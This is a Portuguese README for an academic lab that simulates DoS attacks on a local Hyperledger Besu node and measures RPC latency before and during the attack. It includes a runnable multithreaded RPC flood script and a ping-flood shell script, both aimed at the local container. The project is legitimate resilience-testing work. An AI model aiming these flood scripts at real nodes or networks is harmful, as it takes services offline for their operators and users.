# 🧠 Projeto de Simulação de Ataque DoS/DDoS em Hyperledger Besu

Este projeto tem como objetivo demonstrar de forma **controlada e educativa** como **ataques de negação de serviço (DoS e DDoS)** podem afetar o desempenho de uma **rede blockchain privada** baseada em **Hyperledger Besu**, observando especialmente o impacto no **tempo médio de resposta das chamadas RPC**.

> ⚠️ **Aviso:** Este projeto é exclusivamente para fins acadêmicos e laboratoriais. Não deve ser utilizado em ambientes de produção nem contra redes públicas.

---

## 🚀 Objetivos do Projeto

- Montar uma rede privada Hyperledger Besu (um nó simples ou uma pequena rede com 2-3 nós).
- Gerar tráfego excessivo para simular ataques:
  - **Ataque à camada de rede:** inundação de pacotes (DoS de rede).
  - **Ataque à camada de aplicação:** sobrecarga via requisições RPC simultâneas (DoS de aplicação).
- Medir o impacto:
  - Aumento no **tempo médio de resposta RPC**.
  - Queda no throughput e na disponibilidade do nó.

---

## ⚙️ Estrutura do Projeto

```

projeto-dos-besu/
│
├── docker-compose.yml       # Configuração do nó Hyperledger Besu
├── config/
│   ├── genesis.json          # Arquivo de configuração da blockchain privada
│   └── besu-config.toml      # Configurações personalizadas do Besu
│
├── scripts/
│   ├── stress_rpc.py         # Script para gerar carga RPC (camada de aplicação)
│   ├── ping_flood.sh         # Script simples de DoS de rede (ping flood)
│   └── metrics_rpc.py        # Script para medir o tempo médio de resposta RPC
│
└── README.md

````

---

## 🧩 Pré-requisitos

- Docker e Docker Compose instalados.
- Python 3.10+ com bibliotecas `requests`, `time`, e `statistics`.
- Permissão de administrador para executar Docker (`sudo`).

---

## 🛠️ Como Executar o Projeto

### 1. Inicie o nó Hyperledger Besu

```bash
sudo docker compose up -d
````

Verifique os logs:

```bash
sudo docker logs -f besu-node
```

---

### 2. Teste a comunicação RPC

Com o nó rodando, teste a API RPC:

```bash
curl -X POST --data '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' http://localhost:8545
```

Se retornar um número de bloco, o nó está operacional ✅

---

### 3. Medir tempo médio de resposta RPC (sem ataque)

Execute:

```bash
python3 scripts/metrics_rpc.py
```

Saída esperada:

```
Tempo médio de resposta RPC: 0.045 segundos
```

---

### 4. Simular ataque DoS na camada de aplicação

Abra outro terminal e rode:

```bash
python3 scripts/stress_rpc.py
```

Esse script envia centenas de requisições RPC simultâneas (por exemplo, `eth_blockNumber`).

---

### 5. Simular ataque à camada de rede

Em outro terminal (ou container):

```bash
bash scripts/ping_flood.sh
```

> Este script envia pacotes ICMP em alta frequência ao container do Besu (somente para ambiente de teste).

---

### 6. Medir impacto

Execute novamente o medidor de desempenho:

```bash
python3 scripts/metrics_rpc.py
```

Compare os tempos **antes** e **durante o ataque**.

Exemplo de resultado:

| Situação        | Tempo médio RPC (s) | Observação                    |
| --------------- | ------------------- | ----------------------------- |
| Normal          | 0.045               | Resposta estável              |
| Sob ataque RPC  | 0.487               | Aumento de 980%               |
| Sob ataque ICMP | 1.102               | Queda acentuada de desempenho |

---

## 📊 Scripts Importantes

### `metrics_rpc.py`

Mede o tempo médio de resposta de requisições RPC.

```python
import requests, time, statistics

url = "http://localhost:8545"
payload = {"jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": 1}

tempos = []
for _ in range(30):
    inicio = time.time()
    requests.post(url, json=payload)
    tempos.append(time.time() - inicio)

print(f"Tempo médio de resposta RPC: {statistics.mean(tempos):.3f} segundos")
```

---

### `stress_rpc.py`

Simula ataque de sobrecarga RPC.

```python
import requests, threading

url = "http://localhost:8545"
payload = {"jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": 1}

def flood():
    while True:
        try:
            requests.post(url, json=payload, timeout=1)
        except:
            pass

for _ in range(50):  # 50 threads simultâneas
    threading.Thread(target=flood, daemon=True).start()
```

---

### `ping_flood.sh`

Ataque de inundação ICMP (rede).

```bash
#!/bin/bash
IP_CONTAINER=$(sudo docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' besu-node)
echo "Enviando pacotes ICMP para $IP_CONTAINER"
ping -f -s 1400 $IP_CONTAINER
```

---

## 📚 Conceitos Envolvidos

* **Ataque DoS (Denial of Service):** saturação de recursos de um nó, impedindo o funcionamento normal.
* **Ataque DDoS (Distributed DoS):** múltiplas origens simultâneas causam sobrecarga massiva.
* **Camada de rede:** ataques baseados em pacotes (ICMP, TCP SYN Flood).
* **Camada de aplicação:** ataques via APIs ou RPCs sobrecarregando o processamento.

---

## 🧠 Conclusão

Esse projeto demonstra, de forma simples, como a **resiliência e desempenho** de uma rede **Hyperledger Besu** podem ser comprometidos sob ataques de negação de serviço.
Os resultados podem ser usados para planejar **mitigações** (como firewalls, rate limiting e load balancing).

---

## 👨‍💻 Autor

**João Filho**
Residente em Cibersegurança – PUCPR
Foco: GRC, Blockchain e Segurança Cibernética
📧 contato: [seu-email@exemplo.com](mailto:seu-email@exemplo.com)